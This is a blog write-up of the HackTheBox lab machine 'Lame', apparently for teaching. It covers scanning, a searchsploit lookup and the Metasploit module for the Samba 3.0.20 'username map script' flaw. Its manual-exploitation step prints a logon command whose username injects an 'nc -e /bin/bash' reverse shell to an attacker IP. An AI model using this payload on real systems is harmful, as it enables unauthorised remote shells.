---
layout: post
comments: true
section-type: post
title: HackTheBox Write-up - Lame
category: hackthebox
tags: [ 'samba' ]
---

**DIGEST**

An initial Nmap scan result will show us a vulnerable samba service which is running on port 139. It's vulnerable to the "Samba username map script" vulnerability and exploited using both Manual and Metasploit module.

![lame](../../../../img/htb/lame/lame.png)

<html>

<head>
    <style>
    b {
  font-weight: bold;
}
        table {
            font-family: arial, sans-serif;
            border-collapse: collapse;
            width: 100%;
        }

        td,
        th {
            border: 1px solid #050505;
            text-align: left;
            padding: 8px;
        }

        tr:nth-child(even) {
            background-color: #050505;
        }
    </style>
</head>

<body>
    <h2 class="text-center">Lame</h2>
    <p>
        <table>
            <tbody>
                <tr>
                    <td class="text-right">OS:</td>
                    <td>Linux</td>
                </tr>
                <tr>
                    <td class="text-right">Difficulty:</td>
                    <td> <span class="text-success bold">Easy</span></td>
                </tr>
                <tr>
                    <td class="text-right">Points:</td>
                    <td><span class="text-success">20</span></td>
                </tr>
                <tr>
                    <td class="text-right">Release:</td>
                    <td>14 Mar 2017</td>
                </tr>
                <tr>
                    <td class="text-right">IP:</td>
                    <td>10.10.10.3</td>
                </tr>
            </tbody>
        </table>
    </p>
</body>
</html>


**Tools Used:**

>Nmap, Searchsploit, Metsaploit


**Initial Scan with Nmap:**

![lame-nm](../../../../img/htb/lame/lame-nmap.png)

![lame-nmap](../../../../img/htb/lame/lame-nmap-result.png)

**Vulnerable Samba service on port 139:**

This module exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default "username map script" configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!

**Searchsploit:**

> $ searchsploit Samba 3.0.20

![Searchsploit](../../../../img/htb/lame/lame-sp.png)

**MSF Module - Samba "username map script" Command Execution:**

> $ msf> use exploit/multi/samba/usermap_script

![msf](../../../../img/htb/lame/lame-msf.png)

![shell](../../../../img/htb/lame/lame-msf2.png)

![root](../../../../img/htb/lame/lame-hash.png)

**Manual Exploitation:**

> logon “./=`nohup nc -e /bin/bash 10.10.14.18 4444`"

![Manual](../../../../img/htb/lame/lame-manual1.png)

![Manualroot](../../../../img/htb/lame/lame-manual2.png)

**Rate Matrix:**

![matrix](../../../../img/htb/lame/lame-matrix.png)

<h5><center>Thanks for reading ❤️! </center></h5>
<h5><center>Feel free to leave a comment 💬 below.</center></h5>
